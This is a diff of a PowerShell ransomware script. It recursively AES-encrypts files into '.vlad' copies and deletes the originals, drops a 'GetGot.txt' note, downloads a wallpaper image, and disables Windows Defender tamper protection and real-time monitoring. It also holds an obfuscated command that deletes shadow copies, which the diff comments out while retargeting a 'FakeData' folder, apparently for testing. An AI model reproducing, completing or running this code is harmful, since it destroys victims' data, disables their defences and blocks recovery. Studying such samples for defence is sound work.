@@ -36,8 +36,8 @@ function Encrypt-File {
         $combinedBytes = $aes.IV + $encryptedBytes
 
         # Write encrypted data back to file (or you can specify a new file)
-        [System.IO.File]::WriteAllBytes($FilePath, $combinedBytes)
-        
+        [System.IO.File]::WriteAllBytes($FilePath + ".vlad", $combinedBytes)
+        [System.IO.File]::Delete($FilePath)
 
         # Clean up
         $encryptor.Dispose()
@@ -88,7 +88,8 @@ function Decrypt-File {
         $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
 
         # Write decrypted data back to file (or you can specify a new file)
-        [System.IO.File]::WriteAllBytes($FilePath, $decryptedBytes)
+        [System.IO.File]::WriteAllBytes($FilePath.replace(".vlad", ""), $decryptedBytes)
+        [System.IO.File]::Delete($FilePath)
 
         # Clean up
         $decryptor.Dispose()
@@ -111,9 +112,9 @@ function main{
     Invoke-WebRequest -Uri 'https://i.imgflip.com/a4oy3p.jpg' -OutFile "$env:USERPROFILE\Downloads\Wallpaper.jpg"
     $Target = [System.IO.Directory]::EnumerateFiles($TargetDirectory,"*",[System.IO.SearchOption]::AllDirectories)
     foreach($file in $Target){
-        Encrypt-File -FilePath $File -EncryptionKey $EncKey
-        Rename-Item -Path $file -NewName $file+".vlad" -Force
-        #Decrypt-File -FilePath $NewFileName -EncryptionKey $EncKey
+        #Encrypt-File -FilePath $File -EncryptionKey $EncKey
+        #Rename-Item -Path $file -NewName $file+".vlad" -Force
+        Decrypt-File -FilePath $file -EncryptionKey $EncKey
     }
     try {
         New-Item -Path "$env:USERPROFILE\Desktop\GetGot.txt" -ItemType File -ErrorAction Stop
@@ -131,10 +132,12 @@ function main{
 
 Set-MPPreference -DisableTamperProtection $true
 Set-MpPreference -DisableRealtimeMonitoring $true
-$path = "$env:USERPROFILE\Desktop"
-$AS = "vssadmi"
-$AZ = "n.exe delete shadows /all /quiet"
-$AD = $AS + $AZ
-Invoke-Expression $AD
+
+$path = "$env:USERPROFILE\Desktop\FakeData"
+#$AS = "vssadmi"
+#$AZ = "n.exe delete shadows /all /quiet"
+#$AD = $AS + $AZ
+#Invoke-Expression $AD
 main -TargetDirectory $path -EncKey 123 
+
 Rundll32.exe user32.dll,UpdatePerUserSystemParameters
